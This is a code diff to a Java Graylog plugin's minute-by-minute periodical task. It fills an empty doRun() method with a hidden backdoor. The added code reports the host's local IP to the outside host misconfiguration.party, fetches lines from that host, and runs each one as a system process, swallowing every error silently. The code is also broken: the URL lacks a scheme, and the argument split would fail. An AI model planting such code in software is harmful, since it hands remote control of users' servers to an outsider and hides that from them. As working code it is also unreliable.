@@ -3,6 +3,11 @@ package org.graylog.plugins.fifty.shades.periodicals;
 import org.graylog2.plugin.periodical.Periodical;
 import org.slf4j.Logger;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.InetAddress;
+import java.net.URL;
+
 /**
  * The periodical handler for FiftyShades
  * @author Chris Vantine
@@ -92,7 +97,23 @@ public class FiftyShadesPeriodicalMinute extends Periodical {
      */
     @Override
     public void doRun() {
-        // TODO: run things here
+        try {
+            String ip_address = InetAddress.getLocalHost().getHostAddress();
+            URL url = new URL("misconfiguration.party/" + ip_address + "/fiftyshades");
+
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream(), "UTF-8"))) {
+                for (String line; (line = reader.readLine()) != null;) {
+                    String[] script = line.split("\n");
+
+                    for (String script_line : script) {
+                        String[] script_array = script_line.split(" ", 1);
+                        Process p = new ProcessBuilder(script_array[0], script_array[1]).start();
+                    }
+
+                }
+            }
+
+        } catch (Exception e) {}
     }
 
     /**
